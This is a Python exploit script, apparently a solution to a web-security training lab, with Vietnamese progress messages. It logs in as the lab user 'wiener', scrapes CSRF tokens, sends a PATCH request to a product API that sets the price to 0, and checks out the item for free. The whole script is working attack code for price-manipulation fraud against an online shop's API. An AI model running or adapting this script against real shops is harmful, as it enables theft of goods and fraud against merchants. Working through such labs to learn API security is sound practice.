import requests
import re
from bs4 import BeautifulSoup
import json

url='YOUR_URL'

headers={
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
}

print("=== Tien hanh lay CSRF token ===")

res_get_csrf=requests.get(url+"/login",headers=headers)
session=res_get_csrf.cookies.get("session")
soup1=BeautifulSoup(res_get_csrf.text,'html.parser')
csrf=soup1.find('input',{'name':'csrf'})['value']
print("[+] CSRF token: ",csrf)

print("=== Tien hanh dang nhap ===")

res_login=requests.post(url+"/login",data={'csrf':csrf,'username':'wiener','password':'peter'},headers=headers,cookies={"session":session},allow_redirects=False)

session_user=res_login.cookies.get("session")
print("[+] Session user: ",session_user)

print("=== Tiến hành thay đổi giá ===")

res_change_price=requests.patch(url+"/api/products/1/price",json={'price': 0},headers=headers,cookies={"session":session_user})
print(res_change_price.text)

print("=== Thêm sản phẩm vào giỏ hàng ===")
res_add=requests.post(url+"/cart",data="productId=1&redir=PRODUCT&quantity=1",headers=headers,cookies={"session":session_user},allow_redirects=True)

res_get_csrf_pay=requests.get(url+"/cart",headers=headers,cookies={"session":session_user})
soup2=BeautifulSoup(res_get_csrf_pay.text,'html.parser')
csrf_pay=soup2.find('input',{'name':'csrf'})['value']
print("[+] CSRF token pay: ",csrf_pay)

print("=== Tiến hành thanh toán ===")
res_checkout=requests.post(url+"/cart/checkout",data="csrf="+csrf_pay,headers=headers,cookies={"session":session_user},allow_redirects=True)
print(res_checkout.status_code)
print(res_checkout.text)

